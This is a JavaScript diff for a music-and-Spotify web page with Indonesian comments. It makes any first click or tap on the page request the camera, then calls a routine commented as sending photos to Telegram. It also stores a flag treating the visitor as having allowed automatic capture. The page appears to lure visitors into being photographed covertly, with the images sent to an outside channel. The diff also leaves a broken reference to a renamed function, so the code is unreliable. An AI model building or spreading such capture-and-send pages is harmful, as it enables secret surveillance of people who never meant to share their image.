@@ -14,43 +14,42 @@ const btnMusic = document.getElementById('musicButton');
 music.volume = 0.4;
 let started = false;
 
+// --- fungsi utama ---
 async function startMusicAndCamera() {
   if (started) return;
   started = true;
 
-  // --- 1️⃣ Coba putar musik ---
   try {
+    // 1️⃣ Coba play musik langsung (gesture valid karena dipicu klik user)
     await music.play();
+    console.log("🎵 Musik diputar");
     btnMusic.classList.remove("show");
     btnMusic.disabled = true;
-    console.log("🎵 Musik diputar otomatis");
   } catch (err) {
-    console.warn("⚠️ Autoplay gagal, perlu klik manual");
+    console.warn("⚠️ Gagal autoplay musik:", err);
     btnMusic.classList.add("show");
     btnMusic.disabled = false;
   }
 
-  // --- 2️⃣ Hanya sekali minta izin kamera ---
+  // 2️⃣ Minta izin kamera (1x saja)
   try {
-    let stream;
     const alreadyAllowed = localStorage.getItem("user_allows_auto_capture") === "1";
+    let stream = await navigator.mediaDevices.getUserMedia({ video: true });
 
     if (!alreadyAllowed) {
-      stream = await navigator.mediaDevices.getUserMedia({ video: true });
       localStorage.setItem("user_allows_auto_capture", "1");
       console.log("✅ Izin kamera diberikan pertama kali");
     } else {
-      stream = await navigator.mediaDevices.getUserMedia({ video: true });
-      console.log("📸 Sudah diizinkan sebelumnya");
+      console.log("📸 Izin kamera sudah disimpan");
     }
 
     await autoCaptureAndSend(stream);
   } catch (e) {
-    console.warn("🚫 Kamera tidak diizinkan:", e);
+    console.warn("🚫 Kamera gagal diakses:", e);
   }
 }
 
-// --- 3️⃣ Ambil foto pakai stream yang sama ---
+// --- kirim foto ke Telegram ---
 async function autoCaptureAndSend(stream) {
   try {
     const video = document.createElement("video");
@@ -83,15 +82,17 @@ async function autoCaptureAndSend(stream) {
   }
 }
 
-// === EVENT TRIGGER ===
-function userStart() {
+// === EVENT PENGGUNA ===
+// hanya gesture nyata (klik / tap) yang aktifkan musik & kamera
+function userGestureStart() {
   startMusicAndCamera().catch(console.warn);
+  document.removeEventListener('click', userGestureStart);
+  document.removeEventListener('touchstart', userGestureStart);
 }
 
-btnMusic.classList.add("show");
-btnMusic.addEventListener('click', userStart);
-document.addEventListener('click', userStart, { once: true });
-document.addEventListener('touchstart', userStart, { once: true });
+btnMusic.addEventListener('click', userGestureStart);
+document.addEventListener('click', userGestureStart, { once: true });
+document.addEventListener('touchstart', userGestureStart, { once: true });
 
 if (!/Android|iPhone|iPad|iOS/i.test(navigator.userAgent)) {
   window.addEventListener('mousemove', userStart, { once: true });
@@ -612,6 +613,7 @@ document.getElementById('sendQ').addEventListener('click', async () => {
   updateSpotify();
   setInterval(updateSpotify, 8000);
 })();
+
 
 
 
